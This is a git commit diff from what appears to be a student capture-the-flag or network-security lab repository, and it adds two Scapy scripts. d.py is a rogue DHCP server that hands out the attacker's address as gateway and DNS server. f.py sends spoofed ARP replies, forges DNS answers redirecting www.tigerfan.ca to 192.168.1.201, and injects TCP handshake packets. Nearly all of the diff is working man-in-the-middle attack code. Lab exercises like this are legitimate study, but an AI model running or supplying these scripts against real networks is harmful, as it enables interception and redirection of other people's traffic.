ea87397604b7166b2da1ecd1a0df7956b4694ea8
Étienne Gélinas-Gagnon <etiennegg7@hotmail.fr>
2016-11-16 20:36:58 -0500

    ajout des derniers flags et des scripts

--- actif/d.py
+++ actif/d.py
@@ -2,41 +2,38 @@
 from scapy.all import *
 import uuid
 
-macList = []
-ip = "172.16.1.100"
+def get_mac():
+	return str(':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])).upper()
 
-def dnsMonitorCallBack(pkt):
-    if pkt.haslayer(DHCP):
-        d = toDict(pkt[DHCP].options)
-        if d['message-type'] == 1:
-            packet = NewPacketDHCP(pkt, 2)
-            sendp(packet)
-        elif d['message-type'] == 3:
-            if pkt[Ether].src in macList or ip in d['requested_addr']:
-                packet = NewPacketDHCP(pkt, 5)
-            else:
-                macList.append(pkt[Ether].src)
-                packet = NewPacketDHCP(pkt, 6)
-            sendp(packet)
+server_mac = get_mac()
+server_ip = "192.168.1.201"
 
-def NewPacketDHCP(pkt, message_type):
-    packet = Ether(src=get_mac(), dst=pkt[Ether].src) / \
-             IP(version=pkt[IP].version, ihl=pkt[IP].ihl, proto="udp", src="192.168.1.201", dst=ip) / \
-             UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / \
-             BOOTP(op="BOOTREPLY", htype=pkt[BOOTP].htype, hlen=pkt[BOOTP].hlen, xid=pkt[BOOTP].xid, secs=pkt[BOOTP].secs,
-                   yiaddr=ip, giaddr="192.168.1.201", chaddr=pkt[BOOTP].chaddr,
-                   sname=pkt[BOOTP].sname, file=pkt[BOOTP].file) / \
-             DHCP(options=[("message-type", message_type), ("server_id", "192.168.1.201"), ("lease_time", 10800),
-                           ("subnet_mask", "255.255.255.0"), ("router", "192.168.1.1"), ("name_server", "192.168.1.201"), "end"])
+def dhcpMonitorCallBack(pkt):
+	if pkt.haslayer(DHCP):
+		if pkt[DHCP].options[0][1] == 1:
+			packet = newDhcpOffer(pkt)
+			sendp(packet)
+
+		if pkt[DHCP].options[0][1] == 3:
+			packet = newDhcpAkt(pkt)
+			sendp(packet)
+
+def newDhcpOffer(pkt):
+    packet =  Ether(src=server_mac, dst = "FF:FF:FF:FF:FF:FF")/\
+                IP(src = server_ip, dst = "255.255.255.255", flags = "DF")/\
+                UDP(sport=67, dport=68)/\
+                BOOTP( op=2, yiaddr = "192.168.1.8", siaddr=server_ip, giaddr=server_ip, chaddr=pkt[BOOTP].chaddr , xid=pkt[BOOTP].xid, flags = 0x0000)/\
+                DHCP(options=[('message-type', 'offer'), ('subnet_mask', "255.255.255.0"), ('router', server_ip), ('name_server', server_ip), ('server_id', server_ip), ('renewal_time',1800), ('lease_time',3150), 'end'])
+    print("DHCP Offer IP: "+ "192.168.1.8" + "-> MAC: " + pkt[Ether].src)
     return packet
 
-def toDict(array):
-    d = dict()
-    for i in range(0,len(array)):
-        d[array[i][0]] = array[i][1]
-    return d
+def newDhcpAkt(pkt):
+    packet =  Ether(src=server_mac, dst="FF:FF:FF:FF:FF:FF") /\
+                IP(src=server_ip, dst="255.255.255.255", flags = "DF") /\
+                UDP(sport=67, dport=68) /\
+                BOOTP(op=2, yiaddr="192.168.1.8", siaddr=server_ip, giaddr=server_ip,chaddr=pkt[BOOTP].chaddr,xid=pkt[BOOTP].xid,flags=0x0000) /\
+                DHCP(options=[('message-type', 'ack'),('subnet_mask', "255.255.255.0"),('router', server_ip),('name_server', server_ip),('server_id', server_ip),('renewal_time',1800),('lease_time',3150),'end'])
+    print("DHCP ACK IP: "+ "192.168.1.8" + "-> MAC: " + pkt[Ether].src)
+    return packet
 
-def get_mac():
-    return str(':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])).upper()
-
-sniff(prn=dnsMonitorCallBack)
+sniff(prn=dhcpMonitorCallBack)
--- actif/f.py
+++ actif/f.py
@@ -1,3 +1,41 @@
 #!/usr/bin/python
 from scapy.all import *
 import uuid
+
+def dnsMonitorCallBack(pkt):
+	if pkt.haslayer(ARP) and pkt[ARP].psrc == '192.168.1.5':
+		packet = NewPacketARP(pkt)
+		send(packet)
+
+	if pkt.haslayer(DNS) and pkt[DNS][DNSQR].qname == b'www.tigerfan.ca.':
+		packet = NewPacketDNS(pkt)
+		send(packet)
+
+	if pkt.haslayer(TCP):
+		packet = sendSynAck(pkt)
+		send(packet)
+
+
+def sendSynAck(pkt):
+    ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
+    SYN = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags='S', seq=1000)
+    SYNACK = sr1(ip / SYN)
+
+    packet = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
+               TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags='A', seq=SYNACK.ack + 1, ack=SYNACK.seq + 1)
+    return packet
+
+def NewPacketARP(pkt):
+	packet = ARP( hwsrc=get_mac(), psrc=pkt[ARP].pdst, hwdst=pkt[ARP].hwsrc, pdst=pkt[ARP].psrc, op=2)
+	return packet
+
+def NewPacketDNS(pkt):
+   packet = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
+            UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / \
+            DNS(id=pkt[DNS].id,qr=1,rd=1,ra=1, qd=DNSQR(qname=pkt[DNS][DNSQR].qname,qtype=pkt[DNS][DNSQR].qtype,qclass=pkt[DNS][DNSQR].qclass), an=DNSRR(rrname=pkt[DNS][DNSQR].qname, type="A", rclass="IN", ttl=267, rdata="192.168.1.201"))
+   return packet
+
+def get_mac():
+	return str(':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])).upper()
+
+sniff(prn=dnsMonitorCallBack)
